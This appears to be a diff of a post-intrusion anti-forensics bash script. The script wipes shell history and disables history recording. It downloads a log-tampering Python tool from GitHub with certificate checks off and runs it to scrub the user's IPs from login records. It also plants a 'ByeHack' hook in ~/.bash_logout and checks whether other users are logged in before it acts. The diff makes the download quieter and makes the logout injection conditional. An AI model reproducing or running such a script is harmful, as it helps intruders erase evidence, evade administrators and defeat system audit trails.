@@ -2,16 +2,11 @@ if [ ! -f ~/.bashrc ];then
   touch /tmp/_bash;
 fi
 
-if [ -f ~/.bash_logout ];then
-  cp ~/.bash_logout /tmp/_bash_out;
-else
+if [ ! -f ~/.bash_logout ];then
   touch /tmp/_bash_out;
 fi
 
-echo "ByeHack; " >> ~/.bash_logout;
 history -c ;
-
-
 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
 export HISTFILE=/dev/null;
 export HISTSIZE=0;
@@ -62,6 +57,16 @@ function gglog {
 }
 gglog "collection info for clear"
 
+if [ -f ~/.bash_logout ];then
+  if [[ "$(grep "ByeHack" ~/.bash_logout )" != "" ]];then
+    gglog "ByeHack already ready "
+  else
+    gglog "ByeHack to exit ! "
+    echo "ByeHack;" >> ~/.bash_logout; 
+  fi
+fi
+
+
 last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
 if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
     gglog "warnning user is logined in !!!! , so exit ";
@@ -77,7 +82,7 @@ _bak /var/log/lastlog;
 gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
 
 function CL {
-    wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
+    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
     if [ -f logtamper.py ];then
 	for ip_one in $(cat $my_ips);do
     	    python logtamper.py -m 2 -u $my_name -i $ip_one ;
